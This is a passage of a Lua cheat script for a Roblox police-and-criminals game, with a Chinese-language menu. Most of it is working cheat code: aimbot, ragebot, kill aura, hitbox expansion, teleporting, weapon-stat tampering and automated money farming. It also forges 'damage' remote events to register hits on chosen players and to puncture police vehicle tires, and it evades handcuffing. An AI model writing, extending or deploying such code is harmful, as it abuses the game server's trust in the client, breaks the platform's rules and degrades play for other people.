	SettingsTab:Dropdown({
		Title = "通知位置",
		Values = {
			"左",
			"右"
		},
		Value = "右",
		Callback = function(v)
			WindUI:SetNotifySide(v == "左" and "Left" or "Right")
		end
	})
	SettingsTab:Dropdown({
		Title = "DPI缩放",
		Values = {
			"50%",
			"75%",
			"100%",
			"125%",
			"150%",
			"175%",
			"200%"
		},
		Value = "100%",
		Callback = function(v)
			local n = tonumber(v:gsub("%%", ""));
			if n then
				mainWindow:SetDPIScale(n / 100)
			end
		end
	})
	SettingsTab:Keybind({
		Title = "菜单按键",
		Value = "RightShift",
		Callback = function(v)
			mainWindow:SetToggleKey(Enum.KeyCode[v])
		end
	})
	SettingsTab:Divider()
	SettingsTab:Toggle({
		Title = "随机背景图",
		Value = settings.randomBg,
		Callback = function(v)
			settings.randomBg = v;
			saveSettings();
			createMainWindow()
		end
	})
	SettingsTab:Divider()
	SettingsTab:Toggle({
		Title = "启用边框颜色",
		Value = settings.borderEnabled,
		Callback = function(v)
			settings.borderEnabled = v;
			saveSettings();
			local mf = mainWindow and mainWindow.UIElements and mainWindow.UIElements.Main;
			local s = mf and mf:FindFirstChild("MainBorder");
			if s then
				s.Enabled = v
			end
		end
	})
	SettingsTab:Dropdown({
		Title = "边框颜色",
		Values = {
			"旋转彩虹",
			"默认白色",
			"红色",
			"橙色",
			"黄色",
			"绿色",
			"青色",
			"蓝色",
			"紫色",
			"粉色"
		},
		Value = settings.isBorderRainbow and "旋转彩虹" or "默认白色",
		Callback = function(v)
			if v == "旋转彩虹" then
				applyBorderColor(nil, true)
			elseif v == "默认白色" then
				applyBorderColor(Color3.new(1, 1, 1), false)
			else
				applyBorderColor(GetColor(v), false)
			end
		end
	})
	SettingsTab:Divider()
	SettingsTab:Dropdown({
		Title = "文字颜色",
		Values = {
			"默认",
			"青色",
			"粉色",
			"紫色",
			"橙色",
			"红色",
			"绿色",
			"蓝色",
			"黄色",
			"白色",
			"彩虹"
		},
		Value = "默认",
		Callback = function(v)
			selectedTextColor = v
		end
	})
	SettingsTab:Button({
		Title = "确认应用文字颜色",
		Icon = "check",
		Callback = function()
			local themes = WindUI.GetThemes()
			if not themes or not themes.Dark then
				return
			end
			if rainbowTextConnection then
				rainbowTextConnection:Disconnect();
				rainbowTextConnection = nil
			end
			if selectedTextColor == "彩虹" then
				rainbowTextConnection = RunService.Heartbeat:Connect(function()
					local c = GetRainbowColor(5);
					themes.Dark.Text = c;
					themes.Dark.Placeholder = c;
					themes.Dark.Button = c;
					themes.Dark.TabTitle = c;
					WindUI:SetTheme("Dark")
				end)
			elseif selectedTextColor and selectedTextColor ~= "默认" then
				local c = GetColor(selectedTextColor);
				themes.Dark.Text = c;
				themes.Dark.Placeholder = c;
				themes.Dark.Button = c;
				themes.Dark.TabTitle = c;
				WindUI:SetTheme("Dark")
			else
				WindUI:SetTheme("Dark")
			end
		end
	})
	local Section = mainWindow:Section({
		Title = "功能",
		Opened = true
	})
	local Main = Section:Tab({
		Title = "主要功能",
		Icon = "sliders-h"
	})
	Main:Toggle({
		Title = "无限体力",
		Default = false,
		Callback = function(v)
			State.stamina = v
		end
	})
	Main:Toggle({
		Title = "无限饥饿",
		Default = false,
		Callback = function(v)
			State.food = v
		end
	})
	Main:Toggle({
		Title = "战斗拦截",
		Default = false,
		Callback = setCombatBlock
	})
	Main:Toggle({
		Title = "隐身",
		Default = false,
		Callback = setGhostMode
	})
	Main:Toggle({
		Title = "显示隐身悬浮窗",
		Default = false,
		Callback = function(v)
			ghostQuickShown = v;
			if v then
				createGhostQuick()
			else
				destroyGhostQuick()
			end
		end
	})
	Main:Toggle({
		Title = "锁定隐身悬浮窗位置",
		Default = false,
		Callback = function(v)
			ghostQuickLocked = v;
			if ghostQuickButton then
				ghostQuickButton.Active = not v;
				ghostQuickButton.Draggable = not v
			end
		end
	})
	Main:Toggle({
		Title = "防布娃娃",
		Default = false,
		Callback = function(v)
			State.noRagdoll = v
		end
	})
	Main:Toggle({
		Title = "防摔伤",
		Default = false,
		Callback = function(v)
			State.noFallDamage = v
		end
	})
	Main:Toggle({
		Title = "防越狱拉回",
		Default = false,
		Callback = setAntiPrisonPull
	})
	Main:Toggle({
		Title = "自动捡钱",
		Default = false,
		Callback = function(v)
			State.autoMoney = v
		end
	})
	Main:Toggle({
		Title = "无限子弹",
		Default = false,
		Callback = function(v)
			State.infiniteAmmo = v
		end
	})
	Main:Toggle({
		Title = "快速射击",
		Default = false,
		Callback = function(v)
			State.rapidFire = v;
			if v then
				ModifyWeaponStats()
			end
		end
	})
	local Money = Section:Tab({
		Title = "刷钱",
		Icon = "money-bill-wave"
	})
	Money:Toggle({
		Title = "自动接取任务",
		Default = false,
		Callback = function(v)
			State.autoMission = v
		end
	})
	Money:Toggle({
		Title = "优先高收益任务",
		Default = false,
		Callback = function(v)
			MoneyConfig.priorityHighReward = v
		end
	})
	Money:Input({
		Title = "接取间隔",
		Value = "2",
		PlaceholderText = "输入间隔秒数",
		ClearTextOnFocus = false,
		Callback = function(v)
			local n = tonumber(v);
			if n and n > 0 then
				MoneyConfig.missionInterval = n
			end
		end
	})
	Money:Toggle({
		Title = "安全模式(出租车)",
		Default = false,
		Callback = function(v)
			MoneyConfig.taxiSafe = v
			if v then
				local _, _, root = GetCharacter(LocalPlayer);
				if root then
					MoneyConfig.taxiOrigin = root.Position
				end
			end
		end
	})
	Money:Dropdown({
		Title = "出租车延迟模式",
		Values = {
			"随机时间",
			"距离测算"
		},
		Value = "随机时间",
		Callback = function(v)
			MoneyConfig.taxiDelayMode = v
		end
	})
	Money:Toggle({
		Title = "出租车刷钱",
		Default = false,
		Callback = function(v)
			State.taxi = v
		end
	})
	Money:Toggle({
		Title = "公交车刷钱",
		Default = false,
		Callback = function(v)
			State.bus = v
		end
	})
	Money:Toggle({
		Title = "农民刷钱",
		Default = false,
		Callback = function(v)
			State.farmer = v
		end
	})
	Money:Toggle({
		Title = "自动黑客小游戏",
		Default = false,
		Callback = setAutoHack
	})
	Money:Toggle({
		Title = "高尔夫刷钱",
		Default = false,
		Callback = function(v)
			State.golf = v
		end
	})
	local Combat = Section:Tab({
		Title = "战斗",
		Icon = "crosshairs"
	})
	Combat:Toggle({
		Title = "杀戮光环",
		Default = false,
		Callback = function(v)
			CombatConfig.auraEnabled = v
		end
	})
	Combat:Toggle({
		Title = "只攻击警察",
		Default = false,
		Callback = function(v)
			CombatConfig.auraOnlyPolice = v;
			if v then
				CombatConfig.auraOnlyCivilian = false
			end
		end
	})
	Combat:Toggle({
		Title = "只攻击平民",
		Default = false,
		Callback = function(v)
			CombatConfig.auraOnlyCivilian = v;
			if v then
				CombatConfig.auraOnlyPolice = false
			end
		end
	})
	Combat:Toggle({
		Title = "战斗检测",
		Default = false,
		Callback = function(v)
			CombatConfig.auraCombatCheck = v
		end
	})
	Combat:Slider({
		Title = "攻击范围",
		Value = {
			Min = 10,
			Max = 500,
			Default = 50
		},
		Callback = function(v)
			CombatConfig.auraRange = v
		end
	})
	Combat:Slider({
		Title = "伤害倍率",
		Value = {
			Min = 1,
			Max = 100,
			Default = 5
		},
		Callback = function(v)
			CombatConfig.auraDamage = v
		end
	})
	local Aim = Section:Tab({
		Title = "自瞄",
		Icon = "crosshairs"
	})
	Aim:Toggle({
		Title = "开启/关闭自瞄",
		Default = false,
		Callback = function(v)
			AimConfig.enabled = v
		end
	})
	Aim:Toggle({
		Title = "显示Fov圈",
		Default = false,
		Callback = function(v)
			AimConfig.showFov = v
		end
	})
	Aim:Toggle({
		Title = "显示准心",
		Default = false,
		Callback = function(v)
			AimConfig.showCrosshair = v
		end
	})
	Aim:Toggle({
		Title = "显示追踪线",
		Default = false,
		Callback = function(v)
			AimConfig.showTracer = v
		end
	})
	Aim:Toggle({
		Title = "队伍检测",
		Default = false,
		Callback = function(v)
			AimConfig.teamCheck = v
		end
	})
	Aim:Toggle({
		Title = "好友检测",
		Default = false,
		Callback = function(v)
			AimConfig.friendCheck = v
		end
	})
	Aim:Toggle({
		Title = "墙壁检测",
		Default = false,
		Callback = function(v)
			AimConfig.wallCheck = v
		end
	})
	Aim:Toggle({
		Title = "预判自瞄",
		Default = false,
		Callback = function(v)
			AimConfig.prediction = v
		end
	})
	Aim:Toggle({
		Title = "只自瞄警察",
		Default = false,
		Callback = function(v)
			AimConfig.onlyPolice = v;
			if v then
				AimConfig.onlyCivilian = false
			end
		end
	})
	Aim:Toggle({
		Title = "只自瞄平民",
		Default = false,
		Callback = function(v)
			AimConfig.onlyCivilian = v;
			if v then
				AimConfig.onlyPolice = false
			end
		end
	})
	Aim:Toggle({
		Title = "战斗检测",
		Default = false,
		Callback = function(v)
			AimConfig.combatCheck = v
		end
	})
	Aim:Dropdown({
		Title = "优先锁定模式",
		Values = {
			"准心最近",
			"距离最近",
			"血量最低"
		},
		Value = "准心最近",
		Callback = function(v)
			AimConfig.targetMode = v
		end
	})
	Aim:Dropdown({
		Title = "瞄准身体部位",
		Values = {
			"头",
			"胸",
			"左手",
			"右手",
			"左腿",
			"右腿"
		},
		Value = "头",
		Callback = function(v)
			AimConfig.targetPart = v
		end
	})
	Aim:Slider({
		Title = "Fov圈大小",
		Value = {
			Min = 1,
			Max = 500,
			Default = 50
		},
		Callback = function(v)
			AimConfig.fov = v
		end
	})
	Aim:Slider({
		Title = "自瞄平滑度",
		Value = {
			Min = 1,
			Max = 10,
			Default = 10
		},
		Callback = function(v)
			AimConfig.smoothness = v / 10
		end
	})
	Aim:Slider({
		Title = "Fov圈厚度",
		Value = {
			Min = 1,
			Max = 5,
			Default = 2
		},
		Callback = function(v)
			AimConfig.fovThickness = v
		end
	})
	Aim:Dropdown({
		Title = "颜色选择",
		Values = {
			"红色",
			"黄色",
			"绿色",
			"蓝色",
			"紫色",
			"白色",
			"黑色",
			"彩虹色"
		},
		Value = "红色",
		Callback = function(v)
			AimConfig.color = v
		end
	})
	local Rage = Section:Tab({
		Title = "Ragebot",
		Icon = "bot"
	})
	Rage:Toggle({
		Title = "Ragebot",
		Default = false,
		Callback = function(v)
			RageConfig.enabled = v
		end
	})
	Rage:Slider({
		Title = "攻击距离",
		Value = {
			Min = 10,
			Max = 500,
			Default = 150
		},
		Step = 1,
		Callback = function(v)
			RageConfig.range = v
		end
	})
	Rage:Slider({
		Title = "攻击间隔",
		Value = {
			Min = 0.01,
			Max = 1,
			Default = 0.05
		},
		Step = 0.01,
		Callback = function(v)
			RageConfig.interval = v
		end
	})
	Rage:Dropdown({
		Title = "攻击部位",
		Values = {
			"头部",
			"躯干",
			"左臂",
			"右臂",
			"左腿",
			"右腿"
		},
		Value = "头部",
		Callback = function(v)
			RageConfig.bodyPart = RageBodyParts[v] or "Head"
		end
	})
	Rage:Toggle({
		Title = "职业检测",
		Default = false,
		Callback = function(v)
			RageConfig.jobCheck = v
		end
	})
	Rage:Toggle({
		Title = "墙壁检测",
		Default = false,
		Callback = function(v)
			RageConfig.wallCheck = v
		end
	})
	Rage:Toggle({
		Title = "活体检测",
		Default = false,
		Callback = function(v)
			RageConfig.aliveCheck = v
		end
	})
	Rage:Toggle({
		Title = "战斗状态检测",
		Default = false,
		Callback = function(v)
			RageConfig.combatCheck = v
		end
	})
	Rage:Toggle({
		Title = "锁定警察",
		Default = false,
		Callback = function(v)
			RageConfig.policeLock = v;
			if v then
				RageConfig.civilianLock = false
			end
		end
	})
	Rage:Toggle({
		Title = "锁定平民",
		Default = false,
		Callback = function(v)
			RageConfig.civilianLock = v;
			if v then
				RageConfig.policeLock = false
			end
		end
	})
	Rage:Toggle({
		Title = "弹道显示",
		Default = false,
		Callback = function(v)
			RageConfig.beam = v
		end
	})
	local Hitbox = Section:Tab({
		Title = "范围",
		Icon = "bullseye"
	})
	Hitbox:Toggle({
		Title = "开启/关闭范围",
		Default = false,
		Callback = function(v)
			HitboxConfig.active = v;
			if not v then
				for _, p in ipairs(Players:GetPlayers()) do
					if p.Character then
						resetHitbox(p.Character)
					end
				end
			end
		end
	})
	Hitbox:Input({
		Title = "范围大小设置",
		Value = "10",
		Callback = function(v)
			local n = tonumber(v);
			if n and n > 0 then
				HitboxConfig.size = n
			end
		end
	})
	Hitbox:Input({
		Title = "范围透明度设置(0-1)",
		Value = "0.7",
		Callback = function(v)
			local n = tonumber(v);
			if n and n >= 0 and n <= 1 then
				HitboxConfig.transparency = n
			end
		end
	})
	Hitbox:Dropdown({
		Title = "选择范围颜色",
		Values = {
			"红色",
			"蓝色",
			"黄色",
			"绿色",
			"青色",
			"橙色",
			"紫色",
			"白色",
			"黑色",
			"彩虹色"
		},
		Value = "红色",
		Callback = function(v)
			HitboxConfig.color = v;
			HitboxConfig.rainbow = (v == "彩虹色")
		end
	})
	Hitbox:Dropdown({
		Title = "选择范围材质",
		Values = {
			"Neon",
			"Plastic",
			"Wood",
			"Slate",
			"Concrete",
			"Metal",
			"SmoothPlastic"
		},
		Value = "Neon",
		Callback = function(v)
			HitboxConfig.material = v
		end
	})
	Hitbox:Toggle({
		Title = "NPC范围",
		Default = false,
		Callback = function(v)
			HitboxConfig.affectNPC = v
		end
	})
	Hitbox:Toggle({
		Title = "队伍检测",
		Default = false,
		Callback = function(v)
			HitboxConfig.teamCheck = v
		end
	})
	Hitbox:Toggle({
		Title = "活体检测",
		Default = false,
		Callback = function(v)
			HitboxConfig.checkCorpses = v
		end
	})
	Hitbox:Toggle({
		Title = "显示轮廓",
		Default = false,
		Callback = function(v)
			HitboxConfig.outline = v
		end
	})
	Hitbox:Toggle({
		Title = "启用/禁用碰撞",
		Default = false,
		Callback = function(v)
			HitboxConfig.collision = v
		end
	})
	Hitbox:Toggle({
		Title = "发光效果",
		Default = false,
		Callback = function(v)
			HitboxConfig.glow = v
		end
	})
	Hitbox:Toggle({
		Title = "脉动效果",
		Default = false,
		Callback = function(v)
			HitboxConfig.pulse = v
		end
	})
		local PlayerTab = Section:Tab({
		Title = "玩家",
		Icon = "user"
	})
	PlayerTab:Toggle({
		Title = "开启/关闭跳跃",
		Default = false,
		Callback = function(v)
			PlayerConfig.jumpEnabled = v
			if v then
				startJumpHandler()
			else
				stopJumpHandler()
			end
		end
	})
	PlayerTab:Slider({
		Title = "设置跳跃高度",
		Value = { Min = 50, Max = 400, Default = 50 },
		Callback = function(v)
			PlayerConfig.jumpPower = v
		end
	})
	PlayerTab:Slider({
		Title = "设置跳跃倍数",
		Value = { Min = 1, Max = 10, Default = 1 },
		Callback = function(v)
			PlayerConfig.jumpMultiplier = v
		end
	})
	PlayerTab:Toggle({
		Title = "无限跳跃",
		Default = false,
		Callback = function(v)
			PlayerConfig.infiniteJump = v
		end
	})

	-- ============================================================
	-- 乔尼扩展 第1段：安全传送 + 玩家传送 + 人物旋转
	-- ============================================================
	do
	local Jonny = {}
	local function safePivot(pos)
		local char, _, root = GetCharacter(LocalPlayer)
		if not char or not root or not pos then return false end
		local cf = CFrame.new(pos + Vector3.new(0, 3, 0))
		local dist = (cf.Position - root.Position).Magnitude
		if dist > 100 then
			local steps = math.ceil(dist / 50)
			for i = 1, steps do
				local p = root.Position:Lerp(cf.Position, i / steps)
				pcall(function() root.CFrame = CFrame.new(p) end)
				task.wait(0.01)
			end
		else
			pcall(function() char:PivotTo(cf) end)
		end
		pcall(function()
			if PlayerEvent then
				local id = ((char:GetAttribute("CharPivotToId") or 0) + 1) % 100
				char:SetAttribute("CharPivotToId", id)
				PlayerEvent:FireServer("charPivotTo", cf, char, id)
			end
		end)
		return true
	end
	Jonny.SafePivot = safePivot
	local TPCfg = { Target="", Pos="前方", Fixed=false, _thread=nil }
	local function tpToTarget()
		if not TPCfg.Target or TPCfg.Target == "" then return end
		local target = Players:FindFirstChild(TPCfg.Target)
		if not target or target == LocalPlayer then return end
		local ch = target.Character
		local hrp = ch and ch:FindFirstChild("HumanoidRootPart")
		if not hrp then return end
		local _, _, myRoot = GetCharacter(LocalPlayer)
		if not myRoot then return end
		local cf = hrp.CFrame
		local off
		if TPCfg.Pos == "后方" then off = CFrame.new(0, 0, 5)
		elseif TPCfg.Pos == "头顶" then off = CFrame.new(0, 5, 0)
		elseif TPCfg.Pos == "左侧" then off = CFrame.new(-5, 0, 0)
		elseif TPCfg.Pos == "右侧" then off = CFrame.new(5, 0, 0)
		else off = CFrame.new(0, 0, -5) end
		safePivot((cf * off).Position)
	end
	local function tpFixedStop()
		TPCfg.Fixed = false
		if TPCfg._thread then pcall(task.cancel, TPCfg._thread); TPCfg._thread = nil end
	end
	local function tpFixedStart()
		tpFixedStop()
		TPCfg.Fixed = true
		TPCfg._thread = task.spawn(function()
			while TPCfg.Fixed do pcall(tpToTarget); task.wait(0.1) end
		end)
	end
	Jonny.TPNow = tpToTarget
	Jonny.TPFixedStart = tpFixedStart
	Jonny.TPFixedStop = tpFixedStop
	Jonny.TPCfg = TPCfg
	local Spin = { Enabled=false, Speed=360, Random=false, _angle=0, _conn=nil }
	local function spinStop()
		Spin.Enabled = false
		if Spin._conn then pcall(function() Spin._conn:Disconnect() end); Spin._conn = nil end
	end
	local function spinStart()
		spinStop()
		Spin.Enabled = true; Spin._angle = 0
		Spin._conn = RunService.RenderStepped:Connect(function(dt)
			if not Spin.Enabled then return end
			local _, _, root = GetCharacter(LocalPlayer)
			if not root then return end
			if Spin.Random then Spin._angle = math.random() * math.pi * 2
			else Spin._angle = (Spin._angle + math.rad(Spin.Speed) * dt) % (math.pi * 2) end
			pcall(function()
				root.CFrame = CFrame.new(root.Position) * CFrame.Angles(0, Spin._angle, 0)
			end)
		end)
	end
	Jonny.SpinStart = spinStart
	Jonny.SpinStop = spinStop
	Jonny.Spin = Spin
	_G.JonnyExt = Jonny
	end

	-- ============================================================
	-- 乔尼扩展 第2段：无眩晕 + 扩大视野 + 子弹追踪
	-- ============================================================
	do
	local Jonny = _G.JonnyExt
	local NoDizzy = { Enabled=false, Speed=24, _conn=nil }
	local function noDizzyStop()
		NoDizzy.Enabled = false
		if NoDizzy._conn then pcall(function() NoDizzy._conn:Disconnect() end); NoDizzy._conn = nil end
	end
	local function noDizzyStart()
		noDizzyStop()
		NoDizzy.Enabled = true
		NoDizzy._conn = RunService.RenderStepped:Connect(function()
			if not NoDizzy.Enabled then return end
			local _, hum, root = GetCharacter(LocalPlayer)
			if not hum or not root then return end
			local md = hum.MoveDirection
			if md.Magnitude > 0 then
				root.AssemblyLinearVelocity = Vector3.new(md.X * NoDizzy.Speed, root.AssemblyLinearVelocity.Y, md.Z * NoDizzy.Speed)
			end
		end)
	end
	Jonny.NoDizzyStart = noDizzyStart
	Jonny.NoDizzyStop = noDizzyStop
	Jonny.NoDizzy = NoDizzy
	local FovCfg = { Enabled=false, Value=100, _orig=nil, _conn=nil }
	local function fovStart()
		if FovCfg._conn then return end
		local cam = Workspace.CurrentCamera
		if cam then FovCfg._orig = cam.FieldOfView end
		FovCfg.Enabled = true
		FovCfg._conn = RunService.RenderStepped:Connect(function()
			if not FovCfg.Enabled then return end
			local c = Workspace.CurrentCamera
			if c then c.FieldOfView = FovCfg.Value end
		end)
	end
	local function fovStop()
		FovCfg.Enabled = false
		if FovCfg._conn then pcall(function() FovCfg._conn:Disconnect() end); FovCfg._conn = nil end
		local c = Workspace.CurrentCamera
		if c and FovCfg._orig then pcall(function() c.FieldOfView = FovCfg._orig end) end
	end
	Jonny.FovStart = fovStart
	Jonny.FovStop = fovStop
	Jonny.FovCfg = FovCfg
	local Track = { Enabled=false, Rate=0.12, Fov=200, Mode="all", CombatOnly=false, ForceHit=true, Full360=true, MaxDist=99999, _acc=0, _conn=nil, Target=nil }
	local function trackAlive(plr)
		local _, h = GetCharacter(plr)
		return h and h.Health > 0
	end
	local function trackPass(plr)
		if not plr or plr == LocalPlayer then return false end
		if not trackAlive(plr) then return false end
		if Track.CombatOnly and plr:GetAttribute("CombatMode") ~= true then return false end
		local t = plr.Team and plr.Team.Name or "?"
		if Track.Mode == "police" then return t == "Police" end
		if Track.Mode == "civilian" then return t == "Civilian" end
		return true
	end
	local function trackFind()
		local cam = Workspace.CurrentCamera
		if not cam then return nil end
		local vp = cam.ViewportSize
		local center = Vector2.new(vp.X/2, vp.Y/2)
		local camPos = cam.CFrame.Position
		local r = Track.Fov * (vp.Y / 1080)
		local best, bestD
		for _, plr in ipairs(Players:GetPlayers()) do
			if trackPass(plr) then
				local c = plr.Character
				local part = c and (c:FindFirstChild("Head") or c:FindFirstChild("UpperTorso") or c:FindFirstChild("HumanoidRootPart"))
				if part then
					local dist = (part.Position - camPos).Magnitude
					if dist <= Track.MaxDist then
						local sp = cam:WorldToViewportPoint(part.Position)
						local metric
						if Track.Full360 then metric = dist
						elseif sp.Z > 0 then
							local d = (Vector2.new(sp.X, sp.Y) - center).Magnitude
							if d <= r then metric = d end
						end
						if metric and (not bestD or metric < bestD) then
							bestD = metric
							best = { plr=plr, part=part, pos=part.Position }
						end
					end
				end
			end
		end
		return best
	end
	local function trackFire(t)
		if not t or not t.part or not t.part.Parent then return end
		if not PlayerEvent then return end
		local myRoot = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
		local origin = myRoot and myRoot.Position or t.pos
		local dir = (t.pos - origin)
		if dir.Magnitude < 0.01 then dir = Vector3.new(0,0,-1) end
		dir = dir.Unit
		local from = t.pos - dir * 1.5
		pcall(function()
			PlayerEvent:FireServer("damage", {
				bodyParts = { { "Head", 1 } },
				shotCode = { from, dir },
				pos = t.pos,
				target = t.plr,
				damageFactor = 1.5,
			})
		end)
	end
	local function trackStop()
		Track.Enabled = false
		if Track._conn then pcall(function() Track._conn:Disconnect() end); Track._conn = nil end
		Track.Target = nil
	end
	local function trackStart()
		if Track._conn then return end
		Track.Enabled = true; Track._acc = 0
		Track._conn = RunService.RenderStepped:Connect(function(dt)
			if not Track.Enabled then return end
			local t = trackFind()
			Track.Target = t
			if t and Track.ForceHit then
				Track._acc = Track._acc + dt
				if Track._acc >= Track.Rate then
					Track._acc = 0
					trackFire(t)
				end
			end
		end)
	end
	Jonny.TrackStart = trackStart
	Jonny.TrackStop = trackStop
	Jonny.Track = Track
	_G.JonnyExt = Jonny
	end

	-- ============================================================
	-- 乔尼扩展 第3段：武器修改 + 卸轮胎 + 防手铐
	-- ============================================================
	do
	local Jonny = _G.JonnyExt
	local WPN = { InfiniteAmmo=false, AmmoLock=999, RPMOn=false, RPM=1800, RangeOn=false, Range=5000, ModeOn=false, Mode=2, _conn=nil, _orig={} }
	local function wpnModel()
		local char = LocalPlayer.Character
		if not char then return nil end
		local tool = char:FindFirstChildOfClass("Tool")
		if tool and tool:FindFirstChild("Config") then return tool end
		return nil
	end
	local function wpnConfig()
		local m = wpnModel()
		if not m then return nil end
		local cfg = m:FindFirstChild("Config")
		if not cfg or not cfg:IsA("ModuleScript") then return nil end
		local ok, t = pcall(require, cfg)
		if ok and type(t) == "table" then return t end
		return nil
	end
	local function wpnTick()
		local t = wpnConfig()
		if t then
			if not WPN._orig[t] then
				WPN._orig[t] = { RPM = rawget(t, "RPM"), SHOOT_MODE = rawget(t, "SHOOT_MODE"), BULLET_DISTANCE = rawget(t, "BULLET_DISTANCE") }
			end
			if WPN.RPMOn then pcall(rawset, t, "RPM", math.clamp(WPN.RPM, 60, 6000)) end
			if WPN.RangeOn then pcall(rawset, t, "BULLET_DISTANCE", math.max(600, WPN.Range)) end
			if WPN.ModeOn then pcall(rawset, t, "SHOOT_MODE", WPN.Mode) end
		end
		if WPN.InfiniteAmmo then
			local m = wpnModel()
			if m then
				local cfg = m:FindFirstChild("Config")
				if cfg then
					for _, n in ipairs({"Ammo","TotalAmmo"}) do
						local a = cfg:FindFirstChild(n)
						if a and a:IsA("ValueBase") then pcall(function() a.Value = WPN.AmmoLock end) end
					end
				end
			end
		end
	end
	local function wpnSync()
		local need = WPN.InfiniteAmmo or WPN.RPMOn or WPN.RangeOn or WPN.ModeOn
		if need and not WPN._conn then
			WPN._conn = RunService.Heartbeat:Connect(function() pcall(wpnTick) end)
		elseif not need and WPN._conn then
			WPN._conn:Disconnect(); WPN._conn = nil
		end
	end
	Jonny.WPNSync = wpnSync
	Jonny.WPN = WPN
	local Tire = { Enabled=false, Range=400, Interval=0.15, Count=0, Queue={}, _conn=nil, _thread=nil }
	local function tireTeam(veh)
		local cfg = veh:FindFirstChild("Config")
		local t = cfg and cfg:FindFirstChild("Type")
		local v = t and t.Value
		if v == "Special" then v = "Civilian" end
		return v
	end
	local function tireDriver(veh)
		local cfg = veh:FindFirstChild("Config")
		local d = cfg and cfg:FindFirstChild("LastDrove")
		local p = d and d.Value
		return (typeof(p) == "Instance" and p:IsA("Player")) and p or nil
	end
	local function tireIsTarget(veh)
		if tireTeam(veh) == "Police" then return true end
		local d = tireDriver(veh)
		if d then
			if d.Team and d.Team.Name == "Police" then return true end
			if d:GetAttribute("CombatMode") == true then return true end
		end
		return false
	end
	local function tirePuncture(col)
		if not PlayerEvent or not col or not col.Parent then return end
		local pos = col.Position
		local cam = Workspace.CurrentCamera
		local eye = cam and cam.CFrame.Position or pos
		local dir = (pos - eye)
		if dir.Magnitude < 0.01 then dir = Vector3.new(0,0,-1) else dir = dir.Unit end
		pcall(function()
			PlayerEvent:FireServer("damage", { shotCode = { pos - dir * 1.5, dir }, pos = pos, targetTire = col })
		end)
		Tire.Count = Tire.Count + 1
	end
	local function tireSweep()
		local myRoot = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
		if not myRoot then return end
		local g = Workspace:FindFirstChild("Gameplay")
		local v = g and g:FindFirstChild("Vehicles")
		if not v then return end
		local q = {}
		for _, veh in ipairs(v:GetChildren()) do
			if veh:IsA("Model") and tireIsTarget(veh) then
				local root = veh.PrimaryPart or veh:FindFirstChildWhichIsA("BasePart")
				local dist = root and (root.Position - myRoot.Position).Magnitude or 0
				if not root or dist <= Tire.Range then
					local th = veh:FindFirstChild("Thrusters")
					if th then
						for _, t in ipairs(th:GetChildren()) do
							local w = t:FindFirstChild("Wheel")
							local ti = w and w:FindFirstChild("Tire")
							local col = ti and ti:FindFirstChild("WheelCollision")
							if col and col:IsA("BasePart") and not col:GetAttribute("DontPuncture") then
								table.insert(q, col)
							end
						end
					end
				end
			end
		end
		Tire.Queue = q
	end
	local function tireStop()
		Tire.Enabled = false
		if Tire._conn then pcall(function() Tire._conn:Disconnect() end); Tire._conn = nil end
		Tire._thread = nil; Tire.Queue = {}
	end
	local function tireStart()
		tireStop()
		Tire.Enabled = true
		Tire._thread = task.spawn(function()
			while Tire.Enabled do pcall(tireSweep); task.wait(Tire.Interval) end
		end)
		local acc = 0
		Tire._conn = RunService.Heartbeat:Connect(function(dt)
			if not Tire.Enabled then return end
			acc = acc + dt
			if acc < 0.06 then return end
			acc = 0
			local col = table.remove(Tire.Queue, 1)
			if col and col.Parent then pcall(tirePuncture, col) end
		end)
	end
	Jonny.TireStart = tireStart
	Jonny.TireStop = tireStop
	Jonny.Tire = Tire
	local Cuff = { Enabled=false, Ring=30, Margin=8, Cooldown=0.4, OnlyWanted=true, Pushes=0, _conn=nil, _last=0 }
	local function cuffSelf()
		local c = LocalPlayer.Character
		return c and (c:FindFirstChild("HumanoidRootPart") or c.PrimaryPart)
	end
	local function cuffNearestPolice()
		local root = cuffSelf()
		if not root then return nil, nil end
		local best, bestD
		for _, p in ipairs(Players:GetPlayers()) do
			if p ~= LocalPlayer and p.Team and p.Team.Name == "Police" then
				local ch = p.Character
				local hrp = ch and (ch:FindFirstChild("HumanoidRootPart") or ch.PrimaryPart)
				if hrp then
					local d = (hrp.Position - root.Position).Magnitude
					if not bestD or d < bestD then bestD = d; best = p end
				end
			end
		end
		return best, bestD
	end
	local function cuffPush(plr)
		local root = cuffSelf()
		if not root or not plr then return end
		local ch = plr.Character
		local hrp = ch and (ch:FindFirstChild("HumanoidRootPart") or ch.PrimaryPart)
		if not hrp then return end
		local delta = root.Position - hrp.Position
		local away = Vector3.new(delta.X, 0, delta.Z)
		if away.Magnitude < 0.01 then away = Vector3.new(1,0,0) end
		away = away.Unit
		local target = hrp.Position + away * (Cuff.Ring + Cuff.Margin)
		local ok = Jonny.SafePivot(target)
		if not ok then pcall(function() root.CFrame = CFrame.new(target) end) end
		Cuff.Pushes = Cuff.Pushes + 1
	end
	local function cuffStop()
		Cuff.Enabled = false
		if Cuff._conn then pcall(function() Cuff._conn:Disconnect() end); Cuff._conn = nil end
	end
	local function cuffStart()
		cuffStop()
		Cuff.Enabled = true
		Cuff._conn = RunService.Heartbeat:Connect(function()
			if not Cuff.Enabled then return end
			if Cuff.OnlyWanted then
				local w = LocalPlayer:GetAttribute("WantedLevel")
				if not (w and w ~= false) then return end
			end
			local plr, d = cuffNearestPolice()
			if not plr or not d or d >= Cuff.Ring then return end
			local now = tick()
			if now - Cuff._last < Cuff.Cooldown then return end
			Cuff._last = now
			cuffPush(plr)
		end)
	end
	Jonny.CuffStart = cuffStart
	Jonny.CuffStop = cuffStop
	Jonny.Cuff = Cuff
	_G.JonnyExt = Jonny
	end

	-- ============================================================
	-- 乔尼扩展 第4段：移除激光 + NPC秒杀 + UI 挂载
	-- ============================================================
	do
	local Jonny = _G.JonnyExt
	local Laser = { Enabled=false, Hidden=0, _conn=nil, _wsConn=nil }
	local LASER_NAMES = { "_Laser" }
	local function isLaser(n)
		for _, x in ipairs(LASER_NAMES) do if x == n then return true end end
		return false
	end
	local function hidePart(p)
		pcall(function()
			p.Transparency = 1; p.CanCollide = false
			p.CanTouch = false; p.CanQuery = false
		end)
		Laser.Hidden = Laser.Hidden + 1
	end
	local function laserStop()
		Laser.Enabled = false
		if Laser._conn then pcall(function() Laser._conn:Disconnect() end); Laser._conn = nil end
		if Laser._wsConn then pcall(function() Laser._wsConn:Disconnect() end); Laser._wsConn = nil end
	end
	local function laserStart()
		laserStop()
